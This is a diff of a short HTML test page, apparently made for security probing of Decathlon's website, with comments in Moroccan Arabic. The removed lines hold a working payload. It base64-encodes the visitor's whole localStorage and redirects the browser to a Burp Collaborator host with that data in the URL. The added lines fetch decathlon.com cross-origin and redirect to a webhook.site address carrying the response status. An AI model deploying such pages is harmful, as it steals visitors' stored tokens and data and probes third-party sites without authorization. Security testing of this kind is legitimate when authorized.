@@ -1,16 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1>Security Audit in Progress...</h1>
     <script>
-        // حط هنا رابط الـ Burp Collaborator ديالك
-        var collaborator = "1gijep5a404rm63gcwifvy0rui09o0cp.oastify.com";
+        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
 
-        // غانحاولوا نجبدو غير الـ LocalStorage اللي مسموح بيه
-        // وصيفطوه لـ Collaborator
-        var data = btoa(JSON.stringify(localStorage));
-        
-        // تحويل المتصفح كاملا للـ Collaborator مع الداتا
-        window.location.href = collaborator + "/?leak=" + data;
+        // طلب بسيط لـ Decathlon باش نشوفو الـ Response Headers
+        fetch('https://www.decathlon.com/', {
+            method: 'GET',
+            mode: 'cors'
+        })
+        .then(response => {
+            // غانشوفو واش السيرفر جاوبنا بـ OK (يعني قبل GitHub)
+            var status = response.status;
+            var type = response.type;
+            window.location.href = webhook + "?status=" + status + "&cors_type=" + type;
+        })
+        .catch(err => {
+            window.location.href = webhook + "?error=" + btoa(err.message);
+        });
     </script>
 </body>
 </html>
